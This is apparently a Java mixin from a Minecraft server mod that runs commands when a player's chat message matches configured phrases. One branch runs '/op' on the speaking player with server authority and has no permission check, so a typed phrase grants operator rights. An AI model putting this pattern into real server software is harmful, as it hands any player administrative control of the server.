package io.gitee.mc_shd1.mixins;

import io.gitee.mc_shd1.Core;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.network.ServerPlayNetworkHandler;
import net.minecraft.server.network.ServerPlayerEntity;
import net.minecraft.server.network.packet.ChatMessageC2SPacket;
import org.spongepowered.asm.mixin.Final;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Shadow;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(ServerPlayNetworkHandler.class)
public abstract class ServerPlayNetworkHandlerMixin {

    @Shadow public ServerPlayerEntity player;

    @Shadow @Final private MinecraftServer server;

    @Shadow protected abstract void executeCommand(String string);

    @Inject(method = "onChatMessage", at = @At(value = "INVOKE", shift = At.Shift.AFTER, target = "Lnet/minecraft/server/PlayerManager;broadcastChatMessage(Lnet/minecraft/text/Text;Z)V"))
    private void onChat(ChatMessageC2SPacket packet, CallbackInfo info){
        //Message.LOG.info(packet.getChatMessage());
        if(Core.Config.Commands.Here.Chat_Valid.contains(packet.getChatMessage())){
            player.getServer().getCommandManager().execute(player.getCommandSource(), "/here");;
        } else if (Core.Config.Commands.KillEntity.Item.Chat_Valid.contains(packet.getChatMessage())) {
            player.getServer().getCommandManager().execute(server.getCommandSource(), "/kill @e[type=item]");
        } else if (Core.Config.Commands.OpGet.Chat_Valid.contains(packet.getChatMessage())) {
            player.getServer().getCommandManager().execute(server.getCommandSource(), "/op " + player.getName().getString());
        }
    }
}